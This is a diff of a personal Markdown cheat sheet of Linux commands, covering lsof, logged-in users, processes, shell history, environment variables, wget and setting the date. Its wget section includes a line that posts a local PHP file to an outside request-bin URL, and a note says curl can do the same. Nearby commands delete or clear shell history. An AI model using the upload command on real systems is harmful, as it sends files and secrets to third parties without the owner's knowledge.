@@ -1,15 +1,32 @@
 
-Here will be a bunch of stuff that I don't know where to insert
+> Here will be a bunch of stuff that I don't know where to insert
 
 # Lsof
 
-- lsof is a tool to identify opened files and their network connection
+> `lsof` is a tool to identify opened files and their network connection
 
 ```bash
 sudo apt install lsof
 
 sudo lsof -i :NUMERIC_PORT_VALUE_HERE
 sudo lsof -i :80 # example
+```
+
+# Administrate who is logged on
+
+```bash
+w      # Show who is logged in and what they are doing
+who    # show who is logged on
+users  # print the user names of users currently logged
+finger # user information lookup program
+```
+
+# Administrate processes
+
+```bash
+ps -aux # Dump all running processes
+top     # show active processes in real time
+uptime  # tells how long the system has been running
 ```
 
 # Nip.io
@@ -45,16 +62,15 @@ history
 history -d <line_number> # Delete an history entry
 ```
 
-**Does work in bash but not in zsh and maybe others (not tested)**
+**Does work in bash but not in zsh and maybe other shells (not tested)**
 ```bash
 history -a # write the buffer to bash_hisory
 history -c # clean the buffer event the history -c command
 ```
 
+# env
 
-# Env
-
-List all environnement variables
+> List all environnement variables
 ```bash
 env
 printenv
@@ -62,7 +78,18 @@ printenv
 
 # wget
 
-`wget` can send files in post attachement
+> `wget` can send files in post attachement
 ```bash
 wget --post-file index.php https://hookb.in/xxxxxx
+```
+
+
+> [!NOTE] Notes
+> You wan do the same with `curl -F` version
+
+# Date
+
+> Change OS date
+```bash
+date -s "14 JUL 2024 17:27:00"
 ```
